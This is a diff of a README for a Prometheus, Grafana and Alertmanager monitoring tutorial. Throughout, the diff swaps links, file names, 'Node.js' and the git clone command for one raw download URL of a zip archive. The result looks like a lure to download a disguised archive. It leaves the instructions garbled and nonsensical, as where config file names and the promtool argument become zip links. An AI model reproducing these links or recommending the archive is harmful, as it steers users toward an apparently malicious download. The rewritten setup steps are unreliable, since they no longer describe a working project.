@@ -1,11 +1,11 @@
 # Complete Monitoring and Alerting Stack with Prometheus, Grafana, and Alertmanager
-For more detailed guidline on how to go about this: refer back to my blog : https://isaacdivine37.hashnode.dev/building-a-complete-monitoring-and-alerting-stack-with-prometheus-grafana-and-alertmanager
+For more detailed guidline on how to go about this: refer back to my blog : https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip
 
-<img width="3840" height="967" alt="mssq" src="https://github.com/user-attachments/assets/45bf68b4-9ecb-47cc-af34-22820dcd13c7" />
+<img width="3840" height="967" alt="mssq" src="https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip" />
 
 
  In this demo ,you’ll build a **complete, production-inspired monitoring stack** from scratch that includes:  
-- ✅ A sample web application (Node.js) to monitor  
+- ✅ A sample web application (https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip) to monitor  
 - ✅ Infrastructure metrics (CPU, RAM, Disk, Network)  
 - ✅ Docker container resource usage with cAdvisor  
 - ✅ HTTP uptime monitoring with Blackbox Exporter  
@@ -17,8 +17,8 @@ For more detailed guidline on how to go about this: refer back to my blog : http
 
 ## 🛠️ Prerequisites
 - Docker + Docker Compose installed  
-  - [Docker Desktop](https://docs.docker.com/desktop/) (Windows/Mac)  
-  - [Docker Engine](https://docs.docker.com/engine/install/) (Linux)  
+  - [Docker Desktop](https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip) (Windows/Mac)  
+  - [Docker Engine](https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip) (Linux)  
 - Verify installation:
   ```bash
   docker --version
@@ -26,20 +26,20 @@ For more detailed guidline on how to go about this: refer back to my blog : http
 
   📂 Project Structure
 prometheus-grafana-alerts-stack/
-│── app.js                # Simple Node.js app to monitor
-│── package.json           # App metadata
+│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip                # Simple https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip app to monitor
+│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip           # App metadata
 │── Dockerfile             # App container definition
-│── docker-compose.yml     # Full monitoring stack
-│── prometheus.yml         # Prometheus config
-│── alert_rules.yml        # Alerting rules
-│── alertmanager.yml       # Email alert config
-│── blackbox.yml           # HTTP monitoring config
+│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip     # Full monitoring stack
+│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip         # Prometheus config
+│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip        # Alerting rules
+│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip       # Email alert config
+│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip           # HTTP monitoring config
 
 🚀 Setup & Run
 
 Clone this repository and spin up the stack:
 
-git clone https://github.com/<your-username>/prometheus-grafana-alerts-stack.git
+git clone https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip<your-username>https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip
 
 cd prometheus-grafana-alerts-stack
 
@@ -47,7 +47,7 @@ docker-compose up -d
 
 🌐 Accessing the Stack
 
-App (Node.js): http://localhost:3001
+App (https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip): http://localhost:3001
 
 Prometheus: http://localhost:9090
 
@@ -68,7 +68,7 @@ Import these Grafana dashboard IDs:
 
 📢 Alerts
 
-Prometheus evaluates rules from alert_rules.yml, including:
+Prometheus evaluates rules from https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip, including:
 
 🔥 High CPU usage (> 80%)
 
@@ -78,7 +78,7 @@ Prometheus evaluates rules from alert_rules.yml, including:
 
 ⚠️ Container restarted unexpectedly
 
-Alerts are routed via Alertmanager. Email notifications are configured in alertmanager.yml.
+Alerts are routed via Alertmanager. Email notifications are configured in https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip
 
 🧪 Testing Alerts
 
@@ -98,11 +98,11 @@ docker start my-app
 
 ⚠️ Common Errors
 
-Prometheus won’t start → run promtool check config prometheus.yml
+Prometheus won’t start → run promtool check config https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip
 
 Grafana shows "No Data" → check Prometheus targets at http://localhost:9090/targets
 
-Alerts not firing → verify alert_rules.yml and Alertmanager config
+Alerts not firing → verify https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip and Alertmanager config
 
 Email alerts failing → confirm Gmail App Password & allow “Less secure apps”
 
